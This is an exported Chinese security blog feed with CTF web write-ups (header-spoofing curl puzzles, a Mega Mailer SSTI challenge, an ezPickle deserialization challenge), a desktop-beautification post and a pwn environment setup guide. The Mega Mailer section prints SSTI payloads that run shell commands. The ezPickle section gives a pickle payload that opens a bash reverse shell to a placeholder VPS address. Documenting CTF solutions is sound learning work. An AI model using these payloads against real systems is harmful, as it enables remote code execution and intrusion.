&lt;p>&lt;code>dsc{91v3_m3_4_h4ndfu1_0f_c00k135}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-2">Web/Curly Fries 2&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. Why do logos make things so recognizable?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172502484.png" alt="image-20211004172502484">&lt;/p>
&lt;p>无提示，&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%202">参考wp&lt;/a>&lt;/p>
&lt;p>有点脑洞了，把User-Agent的地方设置为xbox和Linux之后，图片会消失并露出flag&lt;/p>
&lt;p>&lt;code>dsc{1m4g1n3_l1nux_0n_4n_xb0x}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-3">Web/Curly Fries 3&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. I&amp;rsquo;m with you, every step of the way.&lt;/p>
&lt;/blockquote>
&lt;p>直接访问提示405，post一下回显&lt;em>perhaps try Googling me instead?&lt;/em>&lt;/p>
&lt;p>访问/robots.txt，404&lt;/p>
&lt;p>用wappalyzer可以看到这是一个flask应用&lt;/p>
&lt;p>&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%203">参考wp&lt;/a>&lt;/p>
&lt;p>看到第一个提示之后不够敏感，我们可以设置来源refer是google.com&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>回显中提示我们再设置Host&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H&amp;quot;Host:https://dscvit.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>回显&lt;em>potates and carrots are my friends, milk and Cookies will be my end&lt;/em>，不是很明显，但是应该设置cookie=root&lt;/p>
&lt;p>之后回显&lt;em>JFATHER, JMOTHER, JDAUGHTER, ____?&lt;/em>，提示把content-type改为json&lt;/p>
&lt;p>回显*{&amp;lsquo;error&amp;rsquo;: &amp;lsquo;json data missing&amp;rsquo;}*，添加一点data&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;foo&amp;quot;:&amp;quot;bar&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>回显*{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;required&amp;rsquo;}}&lt;em>，将foo改为bar，回显&lt;/em>{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;which club am i at?'}}*&lt;/p>
&lt;p>*不太懂为啥这就能知道把bar赋值为PSG？？？&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;messi&amp;quot;:&amp;quot;psg&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>得到flag &lt;code>dsc{th15_15_w4y_t00_much_w0rk}&lt;/code>&lt;/p>
&lt;h2 id="webmega-mailer">Web/Mega Mailer&lt;/h2>
&lt;blockquote>
&lt;p>We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004005500420.png" alt="image-20211004005500420">&lt;/p>
&lt;p>讲真，之前没接触过&lt;/p>
&lt;p>首先在自己的vps上开一个smtp的服务，用python开&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后其它信息正常填，body部分存在ssti注入，payload来自于&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004181339121.png" alt="image-20211004181339121">&lt;/p>
&lt;p>&lt;code>dsc{819_8r41n_m41L3R}&lt;/code>&lt;/p>
&lt;p>参考：&lt;a href="https://github.com/ComdeyOverFlow/DeconstruCTF-2021/blob/main/Mega-Mailer/README.md">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>说实话，这一篇wp早就水完了，但是中间那个Never gonna lie to you的题因为没有地方复现也没搜着别的wp就一直拖着，拖到现在，还是没找到，放弃了，可惜死了，这个故事告诉我们做题复现要趁早&lt;/p></description></item><item><title>生产力提(mei)高(hua)之路</title><link>https://amiaaaz.github.io/2021/10/28/beautify-my-pc/</link><pubDate>Thu, 28 Oct 2021 13:42:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/28/beautify-my-pc/</guid><description>&lt;h2 id="写在前面">写在前面&lt;/h2>
&lt;p>这将肯定是个长期更新的系列了……&lt;/p>
&lt;p>我对于“美化xx”总有一种痴迷的爱好，小学的时候就折腾过雨滴桌面（现在翻qq邮箱 还能找到14年的远古邮件）虽然可惜的是当时的截图没有保留下来，但印象中是很漂亮很漂亮的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729235145113.png" alt="image-20210729235145113">&lt;/p>
&lt;p>也是那个时候，开始给自己的手机刷机 为了换更好看的字体和模块（那是个海信的安卓机 很便宜 也是人生中第一部手机），害 当然用的是xx一键root工具之类的，结果刚刷好一会就变砖了 = =（当然这不重要）&lt;/p>
&lt;p>初中之后手机也换成了小米，更是三天两头的刷主题商店 构思怎么混搭出最好看的个性主题，但是也就止步于此 高中之后课余时间变少，也慢慢没有空对自己的手机好好的美化 电脑更是不怎么用了；其间倒是倒腾过一段时间的钢笔彩墨 现在还有不少囤货，坛水呀 鲶鱼呀 百乐呀 还有很多其他牌子的墨现在还都在书桌的台子上，各种&lt;del>花里胡哨又毫无卵用&lt;/del>十分好看的笔现在也被相当规整的收在了用作展示的亚克力架子上（是一种可以斜着放笔的架子 图片如下 我有6个这样的收纳笔筒 勉强够放我的笔们）包括很多很贵的限定笔TAT&lt;del>现在回头再看好心疼钱 太败家了&lt;/del>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210730003554519.png" alt="image-20210730003554519">&lt;/p>
&lt;p>兜兜转转，直到大一的寒假才再把手机和电脑方面的美化给拾起来，然而活力和劲头不减当年&lt;/p>
&lt;p>前几天搭博客的时候就想 除了wp和一些学习笔记之外，还有什么是既值得自己记录 又值得分享出来的呢？~~（虽然并没有人会看就是了）~~脑子里第一个蹦出来的就是&amp;quot;beautify&amp;quot;——这是最最适合不过的了！！！&lt;/p>
&lt;h2 id="所以先简单概述一下现状">所以先简单概述一下现状&lt;/h2>
&lt;p>目前的手机是小米10，备用机是小米5sp（没错 就是那个骁龙825发热狂魔……无比后悔当时因为小米6没有3.5mm耳机孔而毅然决然地选择了它）电脑是小新pro16独显版，综合性能都还可以&lt;/p>
&lt;p>手机和电脑作为平时的主要生产力工具，美化的方向和注意点主要有这么几个：&lt;/p>
&lt;ul>
&lt;li>色彩搭配要合理，空间结构要有序&lt;/li>
&lt;li>有轻巧的快捷小工具来提高效率&lt;/li>
&lt;li>自己用着得称心顺手，不随波逐流去选择过于繁杂的美化方式&lt;/li>
&lt;li>兼具颜值和实用性，工具最终服务于人，不追求颜值而牺牲性能&lt;/li>
&lt;/ul>
&lt;p>所以基于以上的~~“圣经”~~“美化思路”，本篇先从我的pc简单说起吧(ゝ∀･)☆&lt;/p>
&lt;p>————预警：可能会很长很长，大概率之后会修修补补形成一个连~续~剧~&lt;/p>
&lt;h2 id="深色模式亮色模式">深色模式？亮色模式！&lt;/h2>
&lt;p>（先给自己叠层甲）手机上我设置晚上11点以后自动深色模式并且非常喜欢这个功能，让我晚上看手机不再眼瞎&lt;/p>
&lt;p>但是！！！但是！！！使用pc的场景都是环境灯光正常的情况，在这样的情况下深色底配上白色/花里胡哨色的代码真的不会让人眼晕吗！！！我是完全接受不来，哒咩！！！&lt;/p>
&lt;p>所以我的各种terminal&amp;amp;ide&amp;amp;其它种种的配色，全 部 都 是 亮色模式&lt;/p>
&lt;h3 id="kali">kali&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028141310507.png" alt="image-20211028141310507">&lt;/p>
&lt;p>这个颜值不用多说吧（&lt;/p>
&lt;h3 id="ubuntu">ubuntu&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028002711973.png" alt="image-20211028002711973.png">&lt;/p>
&lt;h3 id="vscode">vscode&lt;/h3>
&lt;p>主题：Github Light Theme&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028141355813.png" alt="image-20211028141355813">&lt;/p>
&lt;h3 id="idea">idea&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028141605227.png" alt="image-20211028141605227">&lt;/p>
&lt;h2 id="一些基础观念">一些基础观念&lt;/h2>
&lt;h3 id="配色必须统一">配色必须统一&lt;/h3>
&lt;p>一张图就明白了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171048130.png" alt="image-20211028171048130">&lt;/p>
&lt;p>edge我喜欢垂直标签页，会让显示空间变大，开四五十个标签页的时候侧栏也不会拥挤，主题是冰凉的薄荷；Chromium的主题是Sea Foam&lt;/p>
&lt;p>edge曾经我觉得一个痛点是不能给标签页分组，直到最近的更新上了这个功能，那这就没啥说的了，在我心中已经超越了Chrome，edge天下第一！&lt;/p>
&lt;h3 id="桌面必须简洁">桌面必须简洁&lt;/h3>
&lt;p>背景图&lt;a href="https://www.pixiv.net/artworks/89931517">id=89931517&lt;/a>，隐藏了桌面图标和底边任务栏（alt+tab 或者三指的触摸手势要比点击切换应用页面更方便（况且平时只显示桌面的情景很少，大部分情况下都是开一堆堆的页面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171526659.png" alt="image-20211028171526659">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171228208.png" alt="image-20211028171228208">&lt;/p>
&lt;p>win10的磁贴我真的太爱了&lt;/p>
&lt;p>除了偶尔会出Bug 重启个系统结果我排好的顺序全整没了😅崩过好几次了已经&lt;/p>
&lt;p>有些工具在文件夹中，就没有全贴上来了，完整的形态应该是一个心型~&lt;/p>
&lt;h3 id="指针必须花哨">指针必须花哨&lt;/h3>
&lt;p>有谁能拒绝&lt;a href="https://weibo.com/5648640389/KDaUWnzaT?filter=hot&amp;amp;root_comment_id=0&amp;amp;type=comment#_rnd1635413766784">小豆泥&lt;/a>呢！&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028175122377.png" alt="image-20211028175122377">&lt;/p>
&lt;h2 id="shellterminal">shell&amp;amp;terminal&lt;/h2>
&lt;h3 id="zshell">zshell&lt;/h3>
&lt;p>zhell多好用不用我多说吧？kali默认的就是zshell，高亮、代码补全等功能是真的太贴心了，bash跟它一比真是相形见绌，所以我的linux虚拟机以及vps都上了zhell&amp;amp;oh-my-zsh；试了一些主题，但还是默认的robbyrussell深得我心……&lt;/p>
&lt;p>只有皮肤也不行，还得配上给力的插件——&lt;a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-syntax-highlighting&lt;/a>（语法高亮）和&lt;a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-autosuggestions&lt;/a>（根据历史记录自动补全）&lt;/p>
&lt;h3 id="windows-terminal">windows terminal&lt;/h3>
&lt;p>win自带的cmd和powershell，只能说懂得都懂——一个是大黑框一个是大蓝框，前者简陋至极，后者的报错页面（蓝底红字）看着能让人心跳骤停，即使我已经尽力设置背景透明、显示的颜色，出来的效果也不尽人意&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171900582.png" alt="image-20211028171900582">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028171947964.png" alt="image-20211028171947964">&lt;/p>
&lt;p>这时Terminal这个神奇的东西就来救场了——配合&lt;a href="https://github.com/PowerShell/PowerShell/releases">pwsh7&lt;/a>&amp;amp;&lt;a href="https://github.com/JanDeDobbeleer/oh-my-posh2">oh-my-posh&lt;/a>几乎可以达到类zsh的体验&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028142743456.png" alt="image-20211028142743456">&lt;/p>
&lt;p>此处的shell主题是ys（对没看错 就是zsh下很火的那个），背景图&lt;a href="https://www.pixiv.net/artworks/89393158">id=89393158&lt;/a>，配色方案是&lt;a href="https://github.com/mbadolato/iTerm2-Color-Schemes/blob/master/windowsterminal/ayu_light.json">ayu_light&lt;/a>，字体是12号&lt;a href="https://github.com/microsoft/cascadia-code">Cascadia Code PL&lt;/a>；加载了posh-git和oh-my-posh模块，并设置了&lt;a href="https://docs.microsoft.com/zh-cn/powershell/module/psreadline/about/about_psreadline?view=powershell-7.1">PSReadLine&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028170400211.png" alt="image-20211028170400211">&lt;/p>
&lt;p>这样一来我们的pwsh也有了根据历史记录自动补全、tab选择目录这样的功能（更多的功能可以参照官方文档自行设置）&lt;/p>
&lt;p>同时**win+`**这个快捷键可以呼出临时停靠窗口“焦点终端”&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028143336429.png" alt="image-20211028143336429">&lt;/p>
&lt;p>对临时想要执行个脚本、连以下vps、查个东西什么的简直不能更方便！&lt;/p>
&lt;p>同时它还支持通过json来添加配置文件，可以将自己的vps直接加进来&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028164133371.png" alt="image-20211028164133371">&lt;/p>
&lt;p>再设置ssh-key就可以一键免密登录啦了！&lt;/p>
&lt;p>唯一的缺憾，就是不像final shell一样有很好的文件上传下载以及ftp的功能，不然可以直接革了其它ssh终端的命（说的就是你 finalshell）&lt;/p>
&lt;h2 id="必不可少的小工具">必不可少的小工具&lt;/h2>
&lt;h3 id="everythinghttpswwwvoidtoolscomzh-cn">&lt;a href="https://www.voidtools.com/zh-cn/">everything&lt;/a>&lt;/h3>
&lt;p>曾经年少轻狂的我固执的认为这种东西是给命名文件不规范的人准备的&lt;/p>
&lt;p>后来我发现我错了……everything真香！！！！&lt;/p>
&lt;p>它能非常非常迅速的找到我想要的文件，还能进行预览，太好用了简直是&lt;/p>
&lt;h3 id="snipastehttpswwwsnipastecom">&lt;a href="https://www.snipaste.com/">Snipaste&lt;/a>&lt;/h3>
&lt;p>最强截图工具了，截图后可以贴在屏幕上，调整大小、透明度、简单的涂鸦标注都不在话下，占用内存也比较小，装机必备~&lt;/p>
&lt;h3 id="cclosehttpsgithubcomchaohershicclose">&lt;a href="https://github.com/chaohershi/cclose">CClose&lt;/a>&lt;/h3>
&lt;p>又一个装机必备了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028165330401.png" alt="image-20211028165330401">&lt;/p>
&lt;p>就说这些功能还有谁不心动！！！！！！内存占用也很小，可以说极大的提升了我平常的学习效率&lt;/p>
&lt;p>（建议自启动+以管理员模式开启（防止某些过了UAC的应用它没有权限&lt;/p>
&lt;h3 id="digital-clockhttpsgithubcommonodyledigitalclock">&lt;a href="https://github.com/monodyle/DigitalClock">Digital Clock&lt;/a>&lt;/h3>
&lt;p>就是这个会一直出现在我各种截图中的小部件&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028164824172.png" alt="image-20211028164824172">&lt;/p>
&lt;p>够简单，这个大小放在屏幕上也十分合适，还可以设置透明度 不会挡到文字&lt;/p>
&lt;p>但是不知道从什么时候开始在关机的时候会报个错，然后不会保存我已设置好的颜色方案，导致再次开机后需要重新设置&lt;/p>
&lt;p>另外这玩意的内存占用竟然有16M……感觉跟功能并不是十分匹配啊 就只不过在屏幕上层显示而已（但是很可惜没有找到适合的替代品TAT&lt;/p>
&lt;h3 id="tilebeautifyhttpsgithubcombluepointlilactilebeautify">*&lt;a href="https://github.com/BluePointLilac/TileBeautify">TileBeautify&lt;/a>&lt;/h3>
&lt;p>磁贴美化工具，可以将磁贴换成任意的图片，进行组合之后会很好看&lt;/p>
&lt;p>（但是吧 我换电脑之后就没折腾这个了 因为不方便&lt;/p>
&lt;hr>
&lt;p>说实话这篇文档的创建时间是&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028175932903.png" alt="image-20211028175932903">&lt;/p>
&lt;p>别骂了，都是我太懒狗&lt;/p>
&lt;p>之后一定会认真起来的，不管是学习上，生活上，还是个人的发展上&lt;/p>
&lt;p>每天做题什么的，发现自己是真的菜，是真的铁沸物，跟大家比起来我真的水平太低了，是不值一提的那种&lt;/p>
&lt;p>害，不多说了&lt;/p>
&lt;blockquote>
&lt;p>跟别人学，和自己比&lt;/p>
&lt;/blockquote></description></item><item><title>pwn环境配置</title><link>https://amiaaaz.github.io/2021/10/28/pwn-env-init/</link><pubDate>Thu, 28 Oct 2021 00:41:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/28/pwn-env-init/</guid><description>&lt;p>以下为Ubutun16.04&amp;amp;py2的安装过程，其他版本命令几乎相同的~（Ubuntu20&amp;amp;py3的我也装了一个，毕竟py3是主流，技术总是向前发展的嘛~）&lt;/p>
&lt;p>————毕竟我是以初学者的视角来准备pwn的环境，肯定还有很多不全面&amp;amp;想不到的地方，之后用到了会回来补上的~&lt;/p>
&lt;p>安装pip2&amp;amp;pip3&amp;amp;ipython&lt;/p>
&lt;pre tabindex="0">&lt;code>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python get-pip.py
# sudo apt-get install python3-pip
curl https://bootstrap.pypa.io/pip/3.5/get-pip.py -o get-pip.py
sudo python3 get-pip.py
sudo apt-get install ipython
&lt;/code>&lt;/pre>&lt;p>安装py2的pwntools&lt;/p>
&lt;pre tabindex="0">&lt;code>pip2 install pathlib2 # py3无需此条
pip2 install pwntools
&lt;/code>&lt;/pre>&lt;p>安装GDB&amp;amp;插件&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-get install git
git clone https://github.com/pwndbg/pwndbg.git
./setup.sh
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># 使用peda-heap
git clone https://github.com/Mipu94/peda-heap.git
echo &amp;quot;source ~/peda-heap/peda.py&amp;quot; &amp;gt; ~/.gdbinit
# 使用peda
git clone https://github.com/longld/peda.git
echo &amp;quot;source ~/GDB-Plugins/peda/peda.py&amp;quot; &amp;gt; ~/.gdbinit
# 使用gef
git clone https://github.com/hugsy/gef.git
echo &amp;quot;source ~/gef/gef.py&amp;quot; &amp;gt; ~/.gdbinit
# 使用pwndbg
echo &amp;quot;source ~/pwndbg/gdbinit.py&amp;quot; &amp;gt; ~/.gdbinit
# 自动切换脚本 https://blog.csdn.net/aptx4869_li/article/details/81566541
&lt;/code>&lt;/pre>&lt;p>安装one_gadget&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-add-repository ppa:brightbox/ruby-ng
sudo apt-get update
sudo apt-get install ruby2.7 ruby2.7-dev
sudo apt-get install gem
sudo gem install one_gadget
&lt;/code>&lt;/pre>&lt;p>安装32位库&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-get install lib32ncurses5
sudo apt-get install lib32z1
&lt;/code>&lt;/pre>&lt;p>安装checksec&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt instal checksec
&lt;/code>&lt;/pre>&lt;p>安装seccomp-tools&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo gem install seccomp-tools
&lt;/code>&lt;/pre>&lt;p>安装zshell&amp;amp;插件&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-get install zsh
sh -c &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&amp;quot;
# zsh-syntax-highlighting
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git
echo &amp;quot;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&amp;quot; &amp;gt;&amp;gt; ${ZDOTDIR:-$HOME}/.zshrc
source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
# zsh-autosuggestions
git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions
source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># 如遇报错 error: RPC failed; result=35, HTTP code=0; fatal: The remote end hung up unexpectedly
# 将git clone https://xxxx/xxxx.git 换为git clone git://xxxx/xxxx.git
&lt;/code>&lt;/pre>&lt;p>安装virtualbox增强功能&lt;/p>
&lt;pre tabindex="0">&lt;code># 遇报错 unable to access “VBox_GAS_6.0.0 iso9660”
sudo apt-get install --reinstall linux-image-$(uname -r)
&lt;/code>&lt;/pre>&lt;p>最后结果&lt;/p>
&lt;p>ubuntu20+py3+zsh（应该能看出来我更喜欢这个x&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028002711973.png" alt="image-20211028002711973">&lt;/p>
&lt;p>ubuntu16+py2&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211028003012735.png" alt="image-20211028003012735">&lt;/p>
&lt;hr>
&lt;p>第一次装的时候直接卡在了pwntools上，后来发现原因是pip2版本过低且无法直接通过&lt;code>pip -m pip install --upgrade pip&lt;/code>进行升级，只能手动下载get-pip.py后通过py2运行来安装&lt;/p>
&lt;p>这次配完之后最大的感触就是该换个大一点的硬盘了，512G属实绷不住我搞这么多虚拟机……&lt;/p>
&lt;p>之后可能会抽空学一下pwn，属于是web狗卷不动了要给自己找个后路（虽然百分之九十九的概率是两个都很菜，xs），卷起来卷起来！！！&lt;/p></description></item><item><title>2021强网拟态 Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
&lt;p>web有3个都是有了包浆的原题……还有一点脑洞题，反正奇奇怪怪的&lt;/p>
&lt;p>属于是被师傅们带飞了，所以详细的wp还是自己写一写，认真地复现一下&lt;/p>
&lt;/blockquote>
&lt;h2 id="zerocalc">zerocalc&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024031549328.png" alt="image-20211024031549328">&lt;/p>
&lt;p>emmmmmm 说实话一开始没有出 因为没悟出来它这是个什么逻辑2333333&lt;/p>
&lt;h2 id="ezpickle">ezPickle&lt;/h2>
&lt;pre tabindex="0">&lt;code># 用pker.py生成payload
notadmin=GLOBAL('config','notadmin')
notadmin[&amp;quot;admin&amp;quot;]=&amp;quot;yes&amp;quot;
exec=GLOBAL('config','backdoor')
payload='''__import__('subprocess').call(\&amp;quot;echo -e '#!/bin/bash\\nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1'&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x\&amp;quot;,shell=True)'''
exec(payload)
return
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;cconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">notadmin&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">admin&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">yes&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">scconfig&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">backdoor&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0S&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">__import__(&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">subprocess&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">).call(&amp;#34;echo -e &lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&amp;#34;,shell=True)&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;\n&lt;/span>&lt;span style="color:#d88200">p3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">0g2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(g3&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tR.&amp;#39;&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxx&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023215957693.png" alt="image-20211023215957693">&lt;/p>
&lt;p>没什么好说的，基础的pickle题，是2021巅峰极客what_pickle的阉割版（构造的思路几乎一样 但是简单很多），几乎一样的题目还有 [SUCTF 2019]Guess Game&lt;/p>
